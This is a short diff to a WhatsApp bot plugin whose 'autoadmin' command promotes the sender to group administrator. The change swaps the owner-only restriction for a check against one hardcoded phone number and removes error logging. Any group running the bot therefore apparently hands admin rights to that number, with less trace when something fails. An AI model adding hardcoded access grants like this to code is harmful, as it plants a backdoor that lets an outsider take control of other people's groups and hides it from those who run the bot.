@@ -1,4 +1,7 @@
 const handler = async (m, { conn, isAdmin, groupMetadata }) => {
+  // 🔒 Solo para este número exacto
+  if (m.sender !== '5212731590195@s.whatsapp.net') return;
+
   if (isAdmin) return await m.reply('🚩 *¡YA ERES ADM JEFE!*');
   try {
     await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote');
@@ -12,14 +15,12 @@ const handler = async (m, { conn, isAdmin, groupMetadata }) => {
     );
   } catch (e) {
     await m.reply('🚩 Ocurrió un error.');
-    console.error(e);
   }
 };
 
 handler.help = ['autoadmin'];
 handler.tags = ['owner'];
 handler.command = ['autoadmin'];
-handler.rowner = true; // 🔒 Solo funciona para el Owner
 handler.group = true;
 handler.botAdmin = true;
 
